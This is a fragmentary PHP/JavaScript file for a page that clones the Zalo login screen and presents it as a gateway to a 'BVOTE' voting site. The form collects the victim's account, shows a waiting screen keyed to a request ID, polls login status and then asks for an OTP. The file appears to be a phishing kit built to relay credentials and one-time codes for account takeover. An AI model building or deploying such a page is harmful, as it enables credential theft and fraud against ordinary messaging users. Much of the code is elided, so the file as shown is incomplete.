<?php
// ZaloLoginClone.php - BVOTE Auto Login System
?>
<div class="bg-white p-6 rounded-lg text-black w-full flex flex-col justify-center">
  <div class="text-center mb-6">
    ...
    <h2 class="text-2xl font-semibold">Đăng nhập Zalo</h2>
    <p class="text-sm text-gray-600 mt-1">để tiếp tục đến BVOTE</p>
  </div>

  <form id="zalo-login-form" class="space-y-4" onsubmit="return handleZaloLogin(event)">
    <input id="zalo-account" name="account" type="text"
...
<script>
var isLoadingZalo = false;

function handleZaloLogin(e) {
  e.preventDefault();
  if (isLoadingZalo) return false;

  const account = document.getElementById('zalo-account').value.trim();
  if (!account) {
  ...
  .then(data => {
    if (data.success) {
      ...
      showWaitingScreen(data.request_id, 'zalo');
    } else {
  ...
  modal.innerHTML = `
    <div class="bg-white p-6 rounded-lg max-w-md w-full mx-4">
      <div class="text-center">
        ...
        <div class="mt-4">
          <button onclick="checkLoginStatus('${requestId}')" class="bg-blue-500 text-white px-4 py-2 rounded hover:bg-blue-600">
            Kiểm tra trạng thái
          </button>
        </div>
      </div>
    ...
    <div class="bg-white p-6 rounded-lg max-w-md w-full mx-4">
      <div class="text-center">
        ...
        <div class="flex space-x-2">
          <button onclick="verifyOTP('${requestId}')" class="bg-blue-500 text-white px-4 py-2 rounded hover:bg-blue-600">
            Xác thực
          </button>
